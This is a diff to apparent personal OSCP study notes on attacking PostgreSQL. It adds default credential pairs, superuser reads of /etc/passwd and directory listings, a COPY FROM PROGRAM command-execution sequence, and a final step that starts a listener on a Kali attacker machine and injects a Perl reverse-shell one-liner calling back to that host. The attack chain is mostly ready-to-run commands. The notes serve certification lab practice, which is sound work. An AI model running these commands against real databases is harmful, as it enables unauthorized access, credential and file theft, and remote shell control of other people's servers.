@@ -2,16 +2,24 @@ Manual page (https://gist.github.com/Kartones/dd3ff5ec5ea238d4c546#psql
 
 [PostgreSQL RCE](https://github.com/squid22/PostgreSQL_RCE?source=post_page-----6560a2a51947---------------------------------------)
 
+https://blog.1nf1n1ty.team/hacktricks/network-services-pentesting/pentesting-postgresql
+
 [Manual method RCE](https://medium.com/r3d-buck3t/command-execution-with-postgresql-copy-command-a79aef9c2767)
 
 Magic words
 ```dataviewjs
-const page = dv.page("Synced OSCP Notes/Top/Active Notes");const ip = page?.IP ?? "NO IP FOUND";
+const page = dv.page("Synced OSCP Notes/Top/Active Machine");const ip = page?.IP ?? "NO IP FOUND";
 
-const command = `psql -h ${ip} -U postgres -p [port]`;
+const command = `psql -h ${ip} -U postgres -p 5432`;
 
 dv.paragraph("```bash\n" + command + "\n```");
 ```
+Default Username & Passwords:  
+● postgres : postgres  
+● postgres : password  
+● postgres : admin  
+● admin : admin  
+● admin : password
 
 ---
 
@@ -61,6 +69,73 @@ select * from users;
 
 ---
 
+## As SUPERUSER
+
+Reading files and listing directories :
+
+```
+select * from pg_read_file('/etc/passwd', 0, 1000000);
+```
+
+```
+select * from pg_ls_dir('/tmp');
+```
+
+```
+select * from pg_ls_dir('/');
+```
+
+## RCE commands
+
+Prevents conflicts or errors when trying to create a table that already exists
+```
+DROP TABLE IF EXISTS cmd_exec;
+```
+
+Creates a table named cmd_exec with one column cmd_output of type text.This table will store the output of the executed command
+```  
+CREATE TABLE cmd_exec(cmd_output text);
+```
+
+Executes the id command on the server and inserts the output into the cmd_exec table
+```  
+COPY cmd_exec FROM PROGRAM 'id';
+```
+ 
+ Displays the output stored in the cmd_exec table  
+``` 
+SELECT * FROM cmd_exec;
+```
+
+Deletes the cmd_exec table once it has served its purpose
+```
+DROP TABLE IF EXISTS cmd_exec;
+```
+
+## Final Steps
+
+On KALI ATTACKER
+```
+cd ~/Desktop/Tools && python3 penelope.py -p 8080 -O / --oscp-safe
+```
+
+Back on VICTIM HOST PSQL
+```
+DROP TABLE IF EXISTS cmd_exec;
+```
+
+```
+CREATE TABLE cmd_exec(cmd_output text);
+```
+```dataviewjs
+const page = dv.page("Synced OSCP Notes/Top/Active Machine");const KaliIP = page?.["KALI IP"] ?? "NO KALI IP FOUND";
+
+const command = `COPY cmd_exec FROM PROGRAM 'perl -MIO -e ''$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,"${KaliIP}:8080");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;''';`;
+
+dv.paragraph("```bash\n" + command + "\n```");
+```
+
+---
 
 Some interesting flags (to see all, use `-h` or `--help` depending on your psql version):
 
